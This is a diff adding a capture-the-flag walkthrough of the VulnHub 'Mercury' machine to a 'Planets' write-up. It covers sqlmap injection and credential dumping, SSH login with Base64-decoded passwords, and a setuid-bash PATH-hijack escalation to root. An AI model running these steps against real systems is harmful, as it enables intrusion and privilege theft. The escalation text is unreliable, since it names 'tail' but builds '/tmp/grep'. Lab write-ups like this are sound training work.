@@ -1,6 +1,6 @@
-# VulnHub: Earth – Exploitation Walkthrough
+# VulnHub: Planets
 
-
+## Earth
 
 **1. Reconnaissance**
 
@@ -250,3 +250,348 @@ Check the ‘root_flag.txt’
 
 
 <img width="991" height="1113" alt="image" src="https://github.com/user-attachments/assets/69632922-50e4-41f0-a225-4815a771cb46" />
+
+
+<br></br>
+---
+<br></br>
+
+## Mercury
+
+
+**1. Reconnaissance**
+
+Objective: Identify the target system and gather initial network information. Compare the mac address from network scan result and the actual MAC address in Virtual machine :
+
+Nmap / ZenMap for windows – Active scanning and port enumeration
+
+
+Netdiscover for Kali – Passive network discovery
+
+<img width="1125" height="383" alt="image" src="https://github.com/user-attachments/assets/d5fb6421-ab8d-40cd-a4c5-1538bad788f5" />
+
+
+<img width="1013" height="113" alt="image" src="https://github.com/user-attachments/assets/c3fabafd-8ca6-4206-96be-cacbee6f7ddd" />
+
+
+<img width="1125" height="316" alt="image" src="https://github.com/user-attachments/assets/4080b5cb-f9b7-47ea-9e15-6b0f541082af" />
+
+
+
+<img width="1125" height="330" alt="image" src="https://github.com/user-attachments/assets/96668e99-b99a-49c4-9b13-412d9c3e8e46" />
+
+
+
+Key Findings : 
+
+
+
+IP : 192.168.1.201
+
+
+
+Open Ports :
+
+
+
+-	22 SSH (OpenSSH)
+-	8080 http (WSGI Server 0.2 – Python 3.8.2)
+
+
+Educational Insight:
+Reconnaissance is the first step in the Cyber Kill Chain. Passive tools like Netdiscover help identify live hosts, while active scanners like Nmap reveal services and potential attack vectors.
+
+
+
+
+**2. Weaponization**
+
+
+
+
+Objective: Identify vulnerable web components and prepare for exploitation.
+
+
+
+Using ‘dirb’ and ‘Nmap’. It is confirmed that there is ‘robots.txt’ but disallows entry.
+While trying the common different url paths. I noticed something : 
+
+
+<img width="1085" height="437" alt="image" src="https://github.com/user-attachments/assets/e59dd5a5-65e1-4543-b5dd-471c49802d2a" />
+
+
+Tried adding it (mercuryfacts/) in the url path and I get this result : 
+
+
+<img width="988" height="976" alt="image" src="https://github.com/user-attachments/assets/8493e95a-f550-4110-b043-338c9407a29b" />
+
+
+/mercuryfacts/ contains:
+
+Mercury Facts – Informational
+
+Website Todo List – Reveals insecure DB access via raw SQL queries
+
+
+<img width="1025" height="236" alt="image" src="https://github.com/user-attachments/assets/d5a3b408-aebc-4c9c-b498-a3c1f246f618" />
+
+
+<img width="1019" height="444" alt="image" src="https://github.com/user-attachments/assets/09e10a4b-892a-4826-b27f-b35a1f8e061e" />
+
+
+
+Educational Insight : 
+Use models in Django instead of direct MySQL call → They’re currently calling the DB directly. This opens the door to SQL injection.
+
+
+
+**3. Delivery**
+
+
+
+Objective: Deliver the payload to exploit the SQL injection vulnerability.
+
+
+SQL Injection via SQLMap in Kali Linux : 
+```sqlmap -u "http://192.168.1.201:8080/mercuryfacts/”  --batch --risk=3 --level=5```
+
+Flags explained:
+•	-u → target URL
+•	--batch → auto-confirm prompts
+•	--risk=3 → test risky payloads
+•	--level=5 → test more parameters and headers
+
+
+URI parameter #1* is injectable.
+
+
+<img width="912" height="596" alt="image" src="https://github.com/user-attachments/assets/d04674db-7287-441c-8659-85d0620df173" />
+
+
+
+This lists all available databases.:
+```sqlmap -u "http://192.168.1.201:8080/mercuryfacts/#1*/ --dbs```
+
+
+<img width="1125" height="1198" alt="image" src="https://github.com/user-attachments/assets/c2fbb1cb-0b69-4b98-ade9-50d6268a1688" />
+
+
+<img width="1125" height="1072" alt="image" src="https://github.com/user-attachments/assets/85185aa4-2ed8-4965-bfa0-37a5e2c69d78" />
+
+
+
+Discovered databases:
+•	information_schema
+•	mercury
+
+
+
+**4. Exploitation**
+
+
+
+Objective: Extract sensitive data and gain initial access.
+
+
+
+We’ll check the ‘information_schema’ first :
+```sqlmap -u "http://192.168.1.201:8080/mercuryfacts/#1*/" -D information_schema –tables```
+
+
+<img width="1060" height="1106" alt="image" src="https://github.com/user-attachments/assets/aad5814a-27c4-4c23-893e-2f745faf23e4" />
+
+
+
+<img width="1060" height="1106" alt="image" src="https://github.com/user-attachments/assets/097614ae-49ef-4b7d-8121-f4cc261a030c" />
+
+
+
+Didn’t see anything that is helpful to our case. Lets try the other database :
+```sqlmap -u "http://192.168.1.201:8080/mercuryfacts/#1*/" -D mercury –tables```
+
+
+
+<img width="1125" height="773" alt="image" src="https://github.com/user-attachments/assets/8353a118-3631-4998-9bfa-58e95ff920c9" />
+
+
+
+Dump All Data from the Table :
+```sqlmap -u "http://192.168.1.201:8080/mercuryfacts/#1*/" -D mercury -T users –dump```
+
+
+
+<img width="1125" height="859" alt="image" src="https://github.com/user-attachments/assets/fa1a2a65-6cbf-4b77-bff8-b4655e7cae38" />
+
+
+
+We got 4 credentials. Lets try it out. 
+Since there is an port 22 for ssh is open. That’s what im gonna use to enter the device system.
+Login the ‘webmaster’ first since it is an obvious administrator account by the name of it.
+```ssh webmaster@192.168.1.201```
+
+
+
+<img width="1125" height="756" alt="image" src="https://github.com/user-attachments/assets/771f2295-b8bc-4501-8507-0df88c513cf2" />
+
+
+Check directory : ```ls```       Check the textfile : ```cat user_flag.txt```
+
+
+
+<img width="1125" height="247" alt="image" src="https://github.com/user-attachments/assets/dc31b956-99af-4b19-b963-1bae2f42c161" />
+
+
+
+We got the first flag : 
+**[user_flag_8339915c9a454657bd60ee58776f4ccd]**
+
+
+
+**5. Installation**
+
+
+
+Objective: Explore the system and identify paths for privilege escalation.
+
+
+
+Let’s check the remaining file which is ‘mercury_proj’
+
+
+<img width="1125" height="235" alt="image" src="https://github.com/user-attachments/assets/8bc08bd7-7f1a-4aba-97a0-f1be93614a56" />
+
+
+
+Exploring the content of the directory. We got another accounts :
+
+
+
+webmaster for web stuff - webmaster: bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
+
+
+
+linuxmaster for linux stuff – linuxmaster: bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg== 
+
+
+
+
+It says that ‘both restricted’. These strings look like Base64, obfuscated or double-encoded, which means we need to decode them
+
+
+
+
+<img width="817" height="109" alt="image" src="https://github.com/user-attachments/assets/2babbc29-28d2-4969-81b9-9015d9e81515" />
+
+
+
+webmaster for web stuff - webmaster:  mercuryisthesizeof0.056Earths
+
+
+<img width="888" height="102" alt="image" src="https://github.com/user-attachments/assets/01fcdd3d-7524-46c5-9292-c61cbacac289" />
+
+
+
+linuxmaster for linux stuff – linuxmaster: mercurymeandiameteris4880km
+
+
+
+open another ssh session, now using the linuxmaster account : 
+
+
+<img width="693" height="476" alt="image" src="https://github.com/user-attachments/assets/c52d53dd-3a61-431c-b5a1-6a59983d3c67" />
+
+
+
+**6. Command & Control**
+
+
+
+Objective: Establish control and identify privilege escalation vectors.
+
+
+
+Checked the directory but It is empty. Verified the account and check the sudo access : ```sudo -l```
+
+
+
+<img width="1455" height="270" alt="image" src="https://github.com/user-attachments/assets/6f116e30-c556-4008-b742-9c195d9ddfb2" />
+
+
+
+
+We can run check_syslog.sh as root
+Script Analysis :  ```cat /usr/bin/check_syslog.sh```
+
+
+
+<img width="1125" height="144" alt="image" src="https://github.com/user-attachments/assets/12bac60b-661b-42d3-9e04-b0f29f45d066" />
+
+
+
+
+That script is ripe for a PATH hijack exploit. Since /usr/bin/check_syslog.sh runs tail without a full path and we have SETENV privileges, we can craft a malicious tail binary and escalate to root.
+
+
+
+
+Educational Insight:
+Misconfigured scripts with elevated privileges are prime targets for PATH hijacking. This phase involves identifying such weaknesses to gain root access.
+
+
+
+**7. Actions on Objectives**
+
+
+
+Objective: Escalate privileges
+
+
+
+Create a Malicious Binary : 
+```
+echo '#!/bin/bash' > /tmp/grep
+echo 'cp /bin/bash /tmp/rootbash' >> /tmp/grep
+echo 'chmod +s /tmp/rootbash' >> /tmp/grep
+chmod +x /tmp/grep
+```
+
+
+<img width="1125" height="284" alt="image" src="https://github.com/user-attachments/assets/0a0d74c9-53aa-49ff-8bb7-e940970a63d9" />
+
+
+
+Check Root’s Home Directory’ : ```ls -la /root```
+
+
+
+<img width="1125" height="629" alt="image" src="https://github.com/user-attachments/assets/8cf50f8c-5c6c-4d98-b0ec-c85885655fd7" />
+
+
+
+Tried to check the content of ‘root_flag.txt’ using ```cat``` but It says ‘no such file or directory’
+
+
+
+
+the cat command failed—likely because we’re not in the correct working directory when trying to read it :
+``` cd /root```
+
+
+
+Confirm the file exist : 
+``` ls -l root_flag.txt```
+
+
+
+<img width="1125" height="94" alt="image" src="https://github.com/user-attachments/assets/a99a9a49-b912-47b6-ba2c-ffc99656891b" />
+
+
+
+Try to read the flag again : ``` cat root_flag.txt```
+
+
+<img width="1125" height="818" alt="image" src="https://github.com/user-attachments/assets/4d699b69-49ec-4199-a75f-d9c3ba462dac" />
+
+
+
+Now we got the final flag : **[root_flag_69426d9fda579afbffd9c2d47ca31d90]**
